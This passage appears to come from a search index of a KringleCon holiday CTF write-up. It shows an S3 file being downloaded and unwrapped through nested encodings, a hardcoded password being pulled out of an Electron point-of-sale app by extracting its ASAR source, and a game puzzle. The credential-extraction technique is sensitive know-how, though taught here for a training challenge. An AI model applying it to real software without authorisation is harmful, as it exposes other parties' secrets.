bucket and the program conveniently spits out the URL to the public package file inside the bucket. Let's download the file. elf@f749b6bdc8c1:~/bucket_finder$ curl http://s3.amazonaws.com/wrapper3000/package > package % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 829 100 829 0 0 9987 0 --:--:-- --:--:-- --:--:-- 9987 elf@f749b6bdc8c1:~/bucket_finder$ ls README bucket_finder.rb package wordlist","title":"Finding the S3 bucket"},{"location":"objectives/objective2/#unwrapping-the-package-file","text":"Take another look at the MOTD for some hints on unwrapping. Three commands are suggested file to identify a file type man to get more information on a command apropos to search man pages Let's inspect this file by using the file command and cat command elf@f749b6bdc8c1:~/bucket_finder$ file package package: ASCII text, with very long lines elf@ee259b7eb5a8:~/bucket_finder$ cat package UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AXyl91eAsAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6Xn6KBKqFsKyTkaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAAgDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA This looks like some encoded data. Let's use CyberChef tool with the Magic recipe to decode this. Cyberchef detects the data as base64 encoded and decodes it. It detects that the decoded data is a zip archive and proceeds to extract the following file from the archive. package.txt.Z.xz.xxd.tar.bz2 It further detects that the extracted file is bz2 compressed data and proceeds to uncompress it. It detects the uncompressed data as a tar By default the depth is 3 but by increasing the depth, CyberChef is able to unravel many more layers of the file. However CyberChef doesn't seem able to decode beyond a certain point (It isn't able to proceed past package.txt.Z.xz ). Let's try this process on linux terminal. We would use file command to detect the file type and find out the matching operation for this file type (either by a google search or using the apropos or man command). Below is a visualisation of the \"wrapping\" and \"unwrapping\" process along with matching commands. Finally we can apply the operation to \"unwrap\" one layer of the file. The code below shows the entire process. elf@bf22ef953c26:~/bucket_finder$ file package package: ASCII text, with very long lines elf@bf22ef953c26:~/bucket_finder$ base64 -d package > package.zip elf@bf22ef953c26:~/bucket_finder$ file package.zip package.zip: Zip archive data, at least v1.0 to extract elf@bf22ef953c26:~/bucket_finder$ unzip package.zip Archive: package.zip extracting: package.txt.Z.xz.xxd.tar.bz2 elf@bf22ef953c26:~/bucket_finder$ file package.txt.Z.xz.xxd.tar.bz2 package.txt.Z.xz.xxd.tar.bz2: bzip2 compressed data, block size = 900k elf@bf22ef953c26:~/bucket_finder$ bunzip2 package.txt.Z.xz.xxd.tar.bz2 elf@bf22ef953c26:~/bucket_finder$ file package.txt.Z.xz.xxd.tar package.txt.Z.xz.xxd.tar: POSIX tar archive elf@bf22ef953c26:~/bucket_finder$ tar -xvf package.txt.Z.xz.xxd.tar package.txt.Z.xz.xxd elf@bf22ef953c26:~/bucket_finder$ file package.txt.Z.xz.xxd package.txt.Z.xz.xxd: ASCII text elf@bf22ef953c26:~/bucket_finder$ xxd -r package.txt.Z.xz.xxd > pack.xz elf@bf22ef953c26:~/bucket_finder$ file pack.xz pack.xz: XZ compressed data elf@bf22ef953c26:~/bucket_finder$ unxz pack.xz elf@bf22ef953c26:~/bucket_finder$ file pack pack: compress'd data 16 bits elf@bf22ef953c26:~/bucket_finder$ uncompress pack gzip: pack: unknown suffix -- ignored elf@bf22ef953c26:~/bucket_finder$ mv pack pack.gz elf@bf22ef953c26:~/bucket_finder$ uncompress pack.gz elf@bf22ef953c26:~/bucket_finder$ file pack pack: ASCII text elf@bf22ef953c26:~/bucket_finder$ cat pack North Pole: The Frostiest Place on Earth","title":"Unwrapping the Package File"},{"location":"objectives/objective2/#rejoice","text":"We successfully unwrapped Santa's super over-wrapped package! Answer North Pole: The Frostiest Place on Earth","title":"Rejoice"},{"location":"objectives/objective3/","text":"3) Point-of-Sale Password Recovery difficulty \ud83c\udf84 The Objective Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password? Chat with Sugarplum Mary After we help Sugarplum Mary with the Linux Primer Terminal Challenge the following conversation ensues. You did it - great! Maybe you can help me configure my postfix mail server on Gentoo! Just kidding! Hey, wouldja' mind helping me get into my point-of-sale terminal? It's down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up? Shinny says this might be an Electron application. I hear there's a way to extract an ASAR file from the binary, but I haven't looked into it yet. You did it - great! Maybe you can help me configure my postfix mail server on Gentoo! Just kidding! Hey, wouldja' mind helping me get into my point-of-sale terminal? It's down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up? Shinny says this might be an Electron application. I hear there's a way to extract an ASAR file from the binary, but I haven't looked into it yet. Hints Courtesy Sugarplum Mary Electron Applications It's possible to extract the source code from an Electron app. Electron ASAR Extraction There are tools and guides explaining how to extract ASAR from Electron apps. Solution We need to find the password for the POS terminal. The POS terminal is an Electron Application. Electron is a framework for building cross-platform desktop apps with web technologies like JavaScript, HTML, and CSS. Electron applications are generally packaged using asar in an attempt to hide the source code but this process is reversible and it is possible to extract the source code from an asar file. Finding the asar file First let's download the Electron app from the terminal so we can inspect it We can use 7-Zip tool to extract a self extracting *.exe file. jinglebell rock:~/kringle/objective3$file santa-shop.exe santa-shop.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive Let's extract the santa-shop.exe file and find the asar file containing the source code. jinglebell rock:~/kringle/objective3$7z x santa-shop.exe -osanta-shop 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 49824644 bytes (48 MiB) Extracting archive: santa-shop.exe -- Path = santa-shop.exe Type = Nsis Physical Size = 49824644 Method = Deflate Solid = - Headers Size = 102546 Embedded Stub Size = 57856 SubType = NSIS-3 Unicode BadCmd=11 Everything is Ok Files: 9 Size: 50033887 Compressed: 49824644 jinglebell rock:~/kringle/objective3$cd santa-shop/ jinglebell rock:~/kringle/objective3/santa-shop$tree . \u251c\u2500\u2500 $PLUGINSDIR \u2502 \u251c\u2500\u2500 SpiderBanner.dll \u2502 \u251c\u2500\u2500 StdUtils.dll \u2502 \u251c\u2500\u2500 System.dll \u2502 \u251c\u2500\u2500 WinShell.dll \u2502 \u251c\u2500\u2500 app-64.7z \u2502 \u251c\u2500\u2500 nsExec.dll \u2502 \u251c\u2500\u2500 nsProcess.dll \u2502 \u2514\u2500\u2500 nsis7z.dll \u2514\u2500\u2500 Uninstall santa-shop.exe 1 directory, 9 files jinglebell rock:~/kringle/objective3/santa-shop$cd '$PLUGINSDIR'/ jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR$7z x app-64.7z -oapp 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 49323645 bytes (48 MiB) Extracting archive: app-64.7z -- Path = app-64.7z Type = 7z Physical Size = 49323645 Headers Size = 1493 Method = LZMA2:20 LZMA:20 BCJ2 Solid = - Blocks = 74 Everything is Ok Folders: 3 Files: 74 Size: 163007029 Compressed: 49323645 jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR$cd app/ jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app$tree . \u251c\u2500\u2500 LICENSE.electron.txt \u251c\u2500\u2500 LICENSES.chromium.html \u251c\u2500\u2500 chrome_100_percent.pak \u251c\u2500\u2500 chrome_200_percent.pak \u251c\u2500\u2500 d3dcompiler_47.dll \u251c\u2500\u2500 ffmpeg.dll \u251c\u2500\u2500 icudtl.dat \u251c\u2500\u2500 libEGL.dll \u251c\u2500\u2500 libGLESv2.dll \u251c\u2500\u2500 locales \u2502 \u251c\u2500\u2500 am.pak \u2502 \u251c\u2500\u2500 ar.pak \u2502 \u251c\u2500\u2500 bg.pak \u2502 \u251c\u2500\u2500 bn.pak \u2502 \u251c\u2500\u2500 ca.pak \u2502 \u251c\u2500\u2500 cs.pak \u2502 \u251c\u2500\u2500 da.pak \u2502 \u251c\u2500\u2500 de.pak \u2502 \u251c\u2500\u2500 el.pak \u2502 \u251c\u2500\u2500 en-GB.pak \u2502 \u251c\u2500\u2500 en-US.pak \u2502 \u251c\u2500\u2500 es-419.pak \u2502 \u251c\u2500\u2500 es.pak \u2502 \u251c\u2500\u2500 et.pak \u2502 \u251c\u2500\u2500 fa.pak \u2502 \u251c\u2500\u2500 fi.pak \u2502 \u251c\u2500\u2500 fil.pak \u2502 \u251c\u2500\u2500 fr.pak \u2502 \u251c\u2500\u2500 gu.pak \u2502 \u251c\u2500\u2500 he.pak \u2502 \u251c\u2500\u2500 hi.pak \u2502 \u251c\u2500\u2500 hr.pak \u2502 \u251c\u2500\u2500 hu.pak \u2502 \u251c\u2500\u2500 id.pak \u2502 \u251c\u2500\u2500 it.pak \u2502 \u251c\u2500\u2500 ja.pak \u2502 \u251c\u2500\u2500 kn.pak \u2502 \u251c\u2500\u2500 ko.pak \u2502 \u251c\u2500\u2500 lt.pak \u2502 \u251c\u2500\u2500 lv.pak \u2502 \u251c\u2500\u2500 ml.pak \u2502 \u251c\u2500\u2500 mr.pak \u2502 \u251c\u2500\u2500 ms.pak \u2502 \u251c\u2500\u2500 nb.pak \u2502 \u251c\u2500\u2500 nl.pak \u2502 \u251c\u2500\u2500 pl.pak \u2502 \u251c\u2500\u2500 pt-BR.pak \u2502 \u251c\u2500\u2500 pt-PT.pak \u2502 \u251c\u2500\u2500 ro.pak \u2502 \u251c\u2500\u2500 ru.pak \u2502 \u251c\u2500\u2500 sk.pak \u2502 \u251c\u2500\u2500 sl.pak \u2502 \u251c\u2500\u2500 sr.pak \u2502 \u251c\u2500\u2500 sv.pak \u2502 \u251c\u2500\u2500 sw.pak \u2502 \u251c\u2500\u2500 ta.pak \u2502 \u251c\u2500\u2500 te.pak \u2502 \u251c\u2500\u2500 th.pak \u2502 \u251c\u2500\u2500 tr.pak \u2502 \u251c\u2500\u2500 uk.pak \u2502 \u251c\u2500\u2500 vi.pak \u2502 \u251c\u2500\u2500 zh-CN.pak \u2502 \u2514\u2500\u2500 zh-TW.pak \u251c\u2500\u2500 resources \u2502 \u251c\u2500\u2500 app-update.yml \u2502 \u251c\u2500\u2500 app.asar \u2502 \u2514\u2500\u2500 elevate.exe \u251c\u2500\u2500 resources.pak \u251c\u2500\u2500 santa-shop.exe \u251c\u2500\u2500 snapshot_blob.bin \u251c\u2500\u2500 swiftshader \u2502 \u251c\u2500\u2500 libEGL.dll \u2502 \u2514\u2500\u2500 libGLESv2.dll \u251c\u2500\u2500 v8_context_snapshot.bin \u251c\u2500\u2500 vk_swiftshader.dll \u251c\u2500\u2500 vk_swiftshader_icd.json \u2514\u2500\u2500 vulkan-1.dll 3 directories, 74 files We found the app.asar in the resources directory. jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app$cd resources/ jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources$tree . \u251c\u2500\u2500 app-update.yml \u251c\u2500\u2500 app.asar \u2514\u2500\u2500 elevate.exe 0 directories, 3 files Extracting the source code Let's use the instructions in hint to extract the asar jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources$sudo npm install -g asar /usr/local/bin/asar -> /usr/local/lib/node_modules/asar/bin/asar.js + asar@3.0.3 added 17 packages from 53 contributors in 1.029s \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 \u2502 \u2502 New patch version of npm available! 6.14.4 \u2192 6.14.11 \u2502 \u2502 Changelog: https://github.com/npm/cli/releases/tag/v6.14.11 \u2502 \u2502 Run npm install -g npm to update! \u2502 \u2502 \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources$mkdir POS-sourcecode jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources$asar extract app.asar POS-sourcecode jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources$cd POS-sourcecode/ jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources/POS-sourcecode$tree . \u251c\u2500\u2500 README.md \u251c\u2500\u2500 img \u2502 \u251c\u2500\u2500 network1.png \u2502 \u251c\u2500\u2500 network2.png \u2502 \u251c\u2500\u2500 network3.png \u2502 \u2514\u2500\u2500 network4.png \u251c\u2500\u2500 index.html \u251c\u2500\u2500 main.js \u251c\u2500\u2500 package.json \u251c\u2500\u2500 preload.js \u251c\u2500\u2500 renderer.js \u2514\u2500\u2500 style.css jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources/POS-sourcecode$cat README.md Remember, if you need to change Santa's passwords, it's at the top of main.js! jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources/POS-sourcecode$head main.js // Modules to control application life and create native browser window const { app, BrowserWindow, ipcMain } = require('electron'); const path = require('path'); const SANTA_PASSWORD = 'santapass'; // TODO: Maybe get these from an API? const products = [ { name: 'Candy Cane', Rejoice We found the password for the POS terminal by viewing the source code! Answer santapass","title":"3) Point-of-Sale Password Recovery"},{"location":"objectives/objective3/#3-point-of-sale-password-recovery","text":"difficulty \ud83c\udf84","title":"3) Point-of-Sale Password Recovery"},{"location":"objectives/objective3/#the-objective","text":"Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password?","title":"The Objective"},{"location":"objectives/objective3/#chat-with-sugarplum-mary","text":"After we help Sugarplum Mary with the Linux Primer Terminal Challenge the following conversation ensues. You did it - great! Maybe you can help me configure my postfix mail server on Gentoo! Just kidding! Hey, wouldja' mind helping me get into my point-of-sale terminal? It's down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up? Shinny says this might be an Electron application. I hear there's a way to extract an ASAR file from the binary, but I haven't looked into it yet. You did it - great! Maybe you can help me configure my postfix mail server on Gentoo! Just kidding! Hey, wouldja' mind helping me get into my point-of-sale terminal? It's down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up? Shinny says this might be an Electron application. I hear there's a way to extract an ASAR file from the binary, but I haven't looked into it yet.","title":"Chat with Sugarplum Mary"},{"location":"objectives/objective3/#hints-courtesy-sugarplum-mary","text":"","title":"Hints Courtesy Sugarplum Mary"},{"location":"objectives/objective3/#electron-applications","text":"It's possible to extract the source code from an Electron app.","title":"Electron Applications"},{"location":"objectives/objective3/#electron-asar-extraction","text":"There are tools and guides explaining how to extract ASAR from Electron apps.","title":"Electron ASAR Extraction"},{"location":"objectives/objective3/#solution","text":"We need to find the password for the POS terminal. The POS terminal is an Electron Application. Electron is a framework for building cross-platform desktop apps with web technologies like JavaScript, HTML, and CSS. Electron applications are generally packaged using asar in an attempt to hide the source code but this process is reversible and it is possible to extract the source code from an asar file.","title":"Solution"},{"location":"objectives/objective3/#finding-the-asar-file","text":"First let's download the Electron app from the terminal so we can inspect it We can use 7-Zip tool to extract a self extracting *.exe file. jinglebell rock:~/kringle/objective3$file santa-shop.exe santa-shop.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive Let's extract the santa-shop.exe file and find the asar file containing the source code. jinglebell rock:~/kringle/objective3$7z x santa-shop.exe -osanta-shop 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 49824644 bytes (48 MiB) Extracting archive: santa-shop.exe -- Path = santa-shop.exe Type = Nsis Physical Size = 49824644 Method = Deflate Solid = - Headers Size = 102546 Embedded Stub Size = 57856 SubType = NSIS-3 Unicode BadCmd=11 Everything is Ok Files: 9 Size: 50033887 Compressed: 49824644 jinglebell rock:~/kringle/objective3$cd santa-shop/ jinglebell rock:~/kringle/objective3/santa-shop$tree . \u251c\u2500\u2500 $PLUGINSDIR \u2502 \u251c\u2500\u2500 SpiderBanner.dll \u2502 \u251c\u2500\u2500 StdUtils.dll \u2502 \u251c\u2500\u2500 System.dll \u2502 \u251c\u2500\u2500 WinShell.dll \u2502 \u251c\u2500\u2500 app-64.7z \u2502 \u251c\u2500\u2500 nsExec.dll \u2502 \u251c\u2500\u2500 nsProcess.dll \u2502 \u2514\u2500\u2500 nsis7z.dll \u2514\u2500\u2500 Uninstall santa-shop.exe 1 directory, 9 files jinglebell rock:~/kringle/objective3/santa-shop$cd '$PLUGINSDIR'/ jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR$7z x app-64.7z -oapp 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 49323645 bytes (48 MiB) Extracting archive: app-64.7z -- Path = app-64.7z Type = 7z Physical Size = 49323645 Headers Size = 1493 Method = LZMA2:20 LZMA:20 BCJ2 Solid = - Blocks = 74 Everything is Ok Folders: 3 Files: 74 Size: 163007029 Compressed: 49323645 jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR$cd app/ jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app$tree . \u251c\u2500\u2500 LICENSE.electron.txt \u251c\u2500\u2500 LICENSES.chromium.html \u251c\u2500\u2500 chrome_100_percent.pak \u251c\u2500\u2500 chrome_200_percent.pak \u251c\u2500\u2500 d3dcompiler_47.dll \u251c\u2500\u2500 ffmpeg.dll \u251c\u2500\u2500 icudtl.dat \u251c\u2500\u2500 libEGL.dll \u251c\u2500\u2500 libGLESv2.dll \u251c\u2500\u2500 locales \u2502 \u251c\u2500\u2500 am.pak \u2502 \u251c\u2500\u2500 ar.pak \u2502 \u251c\u2500\u2500 bg.pak \u2502 \u251c\u2500\u2500 bn.pak \u2502 \u251c\u2500\u2500 ca.pak \u2502 \u251c\u2500\u2500 cs.pak \u2502 \u251c\u2500\u2500 da.pak \u2502 \u251c\u2500\u2500 de.pak \u2502 \u251c\u2500\u2500 el.pak \u2502 \u251c\u2500\u2500 en-GB.pak \u2502 \u251c\u2500\u2500 en-US.pak \u2502 \u251c\u2500\u2500 es-419.pak \u2502 \u251c\u2500\u2500 es.pak \u2502 \u251c\u2500\u2500 et.pak \u2502 \u251c\u2500\u2500 fa.pak \u2502 \u251c\u2500\u2500 fi.pak \u2502 \u251c\u2500\u2500 fil.pak \u2502 \u251c\u2500\u2500 fr.pak \u2502 \u251c\u2500\u2500 gu.pak \u2502 \u251c\u2500\u2500 he.pak \u2502 \u251c\u2500\u2500 hi.pak \u2502 \u251c\u2500\u2500 hr.pak \u2502 \u251c\u2500\u2500 hu.pak \u2502 \u251c\u2500\u2500 id.pak \u2502 \u251c\u2500\u2500 it.pak \u2502 \u251c\u2500\u2500 ja.pak \u2502 \u251c\u2500\u2500 kn.pak \u2502 \u251c\u2500\u2500 ko.pak \u2502 \u251c\u2500\u2500 lt.pak \u2502 \u251c\u2500\u2500 lv.pak \u2502 \u251c\u2500\u2500 ml.pak \u2502 \u251c\u2500\u2500 mr.pak \u2502 \u251c\u2500\u2500 ms.pak \u2502 \u251c\u2500\u2500 nb.pak \u2502 \u251c\u2500\u2500 nl.pak \u2502 \u251c\u2500\u2500 pl.pak \u2502 \u251c\u2500\u2500 pt-BR.pak \u2502 \u251c\u2500\u2500 pt-PT.pak \u2502 \u251c\u2500\u2500 ro.pak \u2502 \u251c\u2500\u2500 ru.pak \u2502 \u251c\u2500\u2500 sk.pak \u2502 \u251c\u2500\u2500 sl.pak \u2502 \u251c\u2500\u2500 sr.pak \u2502 \u251c\u2500\u2500 sv.pak \u2502 \u251c\u2500\u2500 sw.pak \u2502 \u251c\u2500\u2500 ta.pak \u2502 \u251c\u2500\u2500 te.pak \u2502 \u251c\u2500\u2500 th.pak \u2502 \u251c\u2500\u2500 tr.pak \u2502 \u251c\u2500\u2500 uk.pak \u2502 \u251c\u2500\u2500 vi.pak \u2502 \u251c\u2500\u2500 zh-CN.pak \u2502 \u2514\u2500\u2500 zh-TW.pak \u251c\u2500\u2500 resources \u2502 \u251c\u2500\u2500 app-update.yml \u2502 \u251c\u2500\u2500 app.asar \u2502 \u2514\u2500\u2500 elevate.exe \u251c\u2500\u2500 resources.pak \u251c\u2500\u2500 santa-shop.exe \u251c\u2500\u2500 snapshot_blob.bin \u251c\u2500\u2500 swiftshader \u2502 \u251c\u2500\u2500 libEGL.dll \u2502 \u2514\u2500\u2500 libGLESv2.dll \u251c\u2500\u2500 v8_context_snapshot.bin \u251c\u2500\u2500 vk_swiftshader.dll \u251c\u2500\u2500 vk_swiftshader_icd.json \u2514\u2500\u2500 vulkan-1.dll 3 directories, 74 files We found the app.asar in the resources directory. jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app$cd resources/ jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources$tree . \u251c\u2500\u2500 app-update.yml \u251c\u2500\u2500 app.asar \u2514\u2500\u2500 elevate.exe 0 directories, 3 files","title":"Finding the asar file"},{"location":"objectives/objective3/#extracting-the-source-code","text":"Let's use the instructions in hint to extract the asar jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources$sudo npm install -g asar /usr/local/bin/asar -> /usr/local/lib/node_modules/asar/bin/asar.js + asar@3.0.3 added 17 packages from 53 contributors in 1.029s \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 \u2502 \u2502 New patch version of npm available! 6.14.4 \u2192 6.14.11 \u2502 \u2502 Changelog: https://github.com/npm/cli/releases/tag/v6.14.11 \u2502 \u2502 Run npm install -g npm to update! \u2502 \u2502 \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources$mkdir POS-sourcecode jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources$asar extract app.asar POS-sourcecode jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources$cd POS-sourcecode/ jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources/POS-sourcecode$tree . \u251c\u2500\u2500 README.md \u251c\u2500\u2500 img \u2502 \u251c\u2500\u2500 network1.png \u2502 \u251c\u2500\u2500 network2.png \u2502 \u251c\u2500\u2500 network3.png \u2502 \u2514\u2500\u2500 network4.png \u251c\u2500\u2500 index.html \u251c\u2500\u2500 main.js \u251c\u2500\u2500 package.json \u251c\u2500\u2500 preload.js \u251c\u2500\u2500 renderer.js \u2514\u2500\u2500 style.css jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources/POS-sourcecode$cat README.md Remember, if you need to change Santa's passwords, it's at the top of main.js! jinglebell rock:~/kringle/objective3/santa-shop/$PLUGINSDIR/app/resources/POS-sourcecode$head main.js // Modules to control application life and create native browser window const { app, BrowserWindow, ipcMain } = require('electron'); const path = require('path'); const SANTA_PASSWORD = 'santapass'; // TODO: Maybe get these from an API? const products = [ { name: 'Candy Cane',","title":"Extracting the source code"},{"location":"objectives/objective3/#rejoice","text":"We found the password for the POS terminal by viewing the source code! Answer santapass","title":"Rejoice"},{"location":"objectives/objective4/","text":"4) Operate the Santavator difficulty \ud83c\udf84\ud83c\udf84 The Objective Talk to Pepper Minstix in the entryway to get some hints about the Santavator. Chat with Pepper Minstix After we help Pepper Minstix with the Unescape Tmux Terminal Challenge the following conversation ensues. You found her! Thanks so much for getting her back! Hey, maybe I can help YOU out! There's a Santavator that moves visitors from floor to floor, but it's a bit wonky. You'll need a key and other odd objects. Try talking to Sparkle Redberry about the key. For the odd objects, maybe just wander around the castle and see what you find on the floor. Once you have a few, try using them to split, redirect, and color the Super Santavator Sparkle Stream (S4). You need to power the red, yellow, and green receivers with the right color light! Hints Courtesy Pepper Minstix Santavator Operations It's really more art than science. The goal is to put the right colored light into the receivers on the left and top of the panel. Solution First let's talk to Sparkle Redberry to get the key to the santavator panel Hey hey, Sparkle Redberry here! The Santavator is on the fritz. Something with the wiring is grinchy, but maybe you can rig something up? Here's the key! Good luck! On another note, I heard Santa say that he was thinking of canceling KringleCon this year! At first, I thought it was a joke, but he seemed serious. I\u2019m glad he changed his mind. Have you had a chance to look at the Santavator yet? With that key, you can look under the panel and see the Super Santavator Sparkle Stream (S4). To get to different floors, you'll need to power the various colored receivers. ... There MAY be a way to bypass the S4 stream. We also need to collect various odd objects around the castle Broken Candycane - found at the entrance to the castle Hex Nut We can collect one hex nut near the santavator We get another hex nut when we pass through the door connecting the courtyard and the dining room. Green Bulb- found in the courtyard near the Google booth. Let's open the santavator panel. We can direct the green stream to the receiver. This will give us access to the second floor. On visiting the second floor the objective \"Operate the Santavator\" is completed. Congratulations! Let's continue and get access to all the floors by finding the red and yellow bulbs as well. We can find the red bulb on the second floor. Now let's open the santavator panel again and direct the red stream to the correct receiver.With this in place we can get access to the roof. On the roof we can find the yellow bulb. Let's direct the yellow stream also to the correct receiver in the santavator panel. Rejoice We fixed the santavator... and operated it! Answer This challenge doesn't require us to input an aswer. The objective is unlocked automatically when we use the santavator to access a floor.","title":"4) Operate the Santavator"},{"location":"objectives/objective4/#4-operate-the-santavator","text":"difficulty \ud83c\udf84\ud83c\udf84","title":"4) Operate the Santavator"},{"location":"objectives/objective4/#the-objective","text":"Talk to Pepper Minstix in the entryway to get some hints about the Santavator.","title":"The Objective"},{"location":"objectives/objective4/#chat-with-pepper-minstix","text":"After we help Pepper Minstix with the Unescape Tmux Terminal Challenge the following conversation ensues. You found her! Thanks so much for getting her back! Hey, maybe I can help YOU out! There's a Santavator that moves visitors from floor to floor, but it's a bit wonky. You'll need a key and other odd objects. Try talking to Sparkle Redberry about the key. For the odd objects, maybe just wander around the castle and see what you find on the floor. Once you have a few, try using them to split, redirect, and color the Super Santavator Sparkle Stream (S4). You need to power the red, yellow, and green receivers with the right color light!","title":"Chat with Pepper Minstix"},{"location":"objectives/objective4/#hints-courtesy-pepper-minstix","text":"","title":"Hints Courtesy Pepper Minstix"},{"location":"objectives/objective4/#santavator-operations","text":"It's really more art than science. The goal is to put the right colored light into the receivers on 